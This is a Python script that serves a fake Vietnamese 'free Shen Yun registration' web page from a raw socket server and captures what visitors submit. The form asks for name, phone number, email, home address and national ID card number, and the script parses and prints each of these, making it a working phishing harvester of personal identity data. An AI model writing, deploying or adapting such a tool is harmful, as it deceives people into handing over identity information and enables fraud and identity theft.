import socket
import sys
import urllib.parse

IP = '192.168.1.18'
PORT = 443

def handler():
	session = True
	while True:
		handler_inet = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		handler_inet.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		handler_inet.bind((IP, PORT))
		handler_inet.listen(2)

		print(f"[+] Start Handler On ( http://{IP}:{PORT}/ )...")
		handler_connect, handler_address = handler_inet.accept()

		files_html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>hello word</title>
    <img src="https://www.shenyunperformingarts.org/data/image/original/2022/01/12/950603cf46817ee4e320b2db79be5a71.jpg" width="200" height="200">
</head>
<body>
    <h1>Đăng Ký Shen Yun Miễn Phí</h1>
    <p>Vui Lòng Nhập Thông Tin Phía Dưới</p>
    <form action="/dang-ky-shen-yun-mien-phi" method="POST">
        <label for="usr">Họ Tên: </label>
        <input type="text" id="name" name="name" required><br>

        <body></body>

        <label for="sdt">Số Điện Thoại: </label>
        <input type="text" id="sdt" name="sdt" required><br>

        <body></body>

        <label for="mail">Email: </label>
        <input type="text" id="email" name="email" required><br>

        <body></body>

        <label for="address">Địa Chỉ Nhà: </label>
        <input type="text" id="addr" name="addr" required><br>

        <label for="id_card">Số Chứng Minh: </label>
        <input type="text" id="ttcn" name="ttcn" required><br>

        <input type="submit" value="Gửi Thông Tin"> 

    </form>
</body>
</html>"""

		response = "HTTP/1.1 200 OK\r\n\r\n" + files_html
		handler_connect.sendall(response.encode())

		print(f"[+] One REQUESTS From {handler_address}...")

		data = handler_connect.recv(1024).decode()
		if 'POST /dang-ky-shen-yun-mien-phi' in data:
			print('[+] form data spliting...')
			data_lines = data.split("\r\n")
			for line in data_lines:
				if "name=" in line:
					names = line.split("name=")[1].split("&")[0]
					names = urllib.parse.unquote(names)
					print(f"[-] Name: {names}")
				if "sdt=" in line:
					sdt = line.split("sdt=")[1].split("&")[0]
					names = urllib.parse.unquote(sdt)
					print(f"[-] Phone: {sdt}")
				if "mail=" in line:
					mail = line.split("mail=")[1].split("&")[0]
					names = urllib.parse.unquote(mail)
					print(f"[-] Email: {mail}")
				if "addr=" in line:
					addr = line.split("addr=")[1].split("&")[0]
					names = urllib.parse.unquote(addr)
					print(f"[-] Address: {addr}")
				if "ttcn=" in line:
					ttcn = line.split("ttcn=")[1].split("&")[0]
					names = urllib.parse.unquote(ttcn)
					print(f"[-] Card: {ttcn}")
				

		handler_connect.close()
handler()
